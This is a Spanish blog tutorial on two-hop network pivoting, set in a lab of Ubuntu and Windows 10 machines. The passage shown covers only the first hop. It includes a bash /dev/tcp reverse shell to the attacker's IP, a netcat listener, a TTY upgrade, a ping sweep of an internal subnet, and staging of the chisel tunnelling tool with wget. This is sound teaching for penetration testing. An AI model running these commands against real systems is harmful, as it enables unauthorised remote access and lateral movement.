---
layout: single
title: Pivoting con dos saltos
excerpt: "Para hacer este artículo me he montado un pequeño laboratorio con dos máquinas ubuntu server 22.04 y otra con windows 10, para mostrar como funciona el pivoting con dos saltos. No se explota ninguna vulnerabilidad puesto que el propósito del artículo es sólamente mostrar como funciona el pivoting cuando hay más de un salto. Accederemos a la máquina server1 (ubuntu) y montaremos un proxy socks para, a través de él, llegar a la máquina windows, que está en otro segmento de red. Después accederemos a la máquina windows a través del proxy controlando el tráfico de ida y el de vuelta, y por último accederemos a la tercera máquina server2 (ubuntu), que estará en un tercer segmento de red, a través de otro proxy que habremos montado en la máquina windows controlando también el tráfico en la ida y en la vuelta, donde esta vez pasará a través de dos máquinas para llegar a la nuestra."
date: 2023-05-07
classes: wide
header:
  teaser: /assets/images/Pivoting/pivoting.jpg
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Linux
  - Pivoting
---

Para hacer este artículo me he montado un pequeño laboratorio con dos máquinas ubuntu server 22.04 y otra con windows 10, para mostrar como funciona el pivoting con dos saltos. No se explota ninguna vulnerabilidad puesto que el propósito del artículo es sólamente mostrar como funciona el pivoting cuando hay más de un salto. Accederemos a la máquina server1 (ubuntu) y montaremos un proxy socks para, a través de él, llegar a la máquina windows, que está en otro segmento de red. Después accederemos a la máquina windows a través del proxy controlando el tráfico de ida y el de vuelta, y por último accederemos a la tercera máquina server2 (ubuntu), que estará en un tercer segmento de red, a través de otro proxy que habremos montado en la máquina windows controlando también el tráfico en la ida y en la vuelta, donde esta vez pasará a través de dos máquinas para llegar a la nuestra.

## Descripción del laboratorio

### Máquina server1
 - SO: Ubuntu Server 22.04
 - Interfaz de red 1: 192.168.0.145
 - Interfaz de red 2: 172.16.0.2

### Máquina Windows 10
 - SO: Windows 10 Pro x64
 - Interfaz de red 1: 172.16.0.4
 - Interfaz de red 2: 10.10.0.3

### Máquina server2
 - SO: Ubuntu Server 22.04
 - Interfaz de red 1: 10.10.0.4

### Máquina atacante:
 - SO: Arch Linux
 - Interfaz de red 1: 192.168.0.151

## Acceso a la máquina server1

Vamos a suponer que hemos descubierto una vulnerabilidad en la máquina server1, y hemos conseguido ejecución de código. Lanzamos una reverse shell y obtenemos acceso directo puesto que la máquina está en el mismo segmento de red que la nuestra.

Nos ponemos a la escucha con netcat en nuestra máquina y lanzamos una reverse shell desde server1 y nos llega perfectamente.

Máquina atacante:

```bash
sudo nc -lvnp 443
```
![](/assets/images/Pivoting/pivoting2.png)

Máquina server1:
```bash
sh -i >& /dev/tcp/192.168.0.151/443 0>&1
```
![](/assets/images/Pivoting/pivoting1.png)

Y convertimos la shell en una tty totalmente interactiva.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+z
stty raw -echo;fg
INTRO
export TERM=xterm
```

![](/assets/images/Pivoting/pivoting3.png)

Ahora vemos que la máquina tiene otra interfaz de red con la ip 172.16.0.2 y buscamos más máquinas que puedan estar en este segmento de red.

```bash
ip a
for i in {1..255} ; do (ping -c 1 172.16.0.$i | grep "bytes from" | cut -d ' ' -f4 | tr -dd ':' &); done
```

![](/assets/images/Pivoting/pivoting4.png)

Vemos que hay otra máquina en la ip 172.16.0.4

Vamos a descargar chisel para linux desde aquí [chisel](https://github.com/jpillora/chisel/releases) y lo vamos a subir a la máquina server1.

Levantamos un servidor http en nuestra máquina compartiendo chisel, lo descargamos desde la máquina server1 con wget y le damos permisos de ejecución.

Máquina atacante:
```bash
python3 -m http.server
```

Máquina server1:
```bash
wget http://192.168.0.151:8000/chisel
chmod +x chisel
```

![](/assets/images/Pivoting/pivoting5.png)


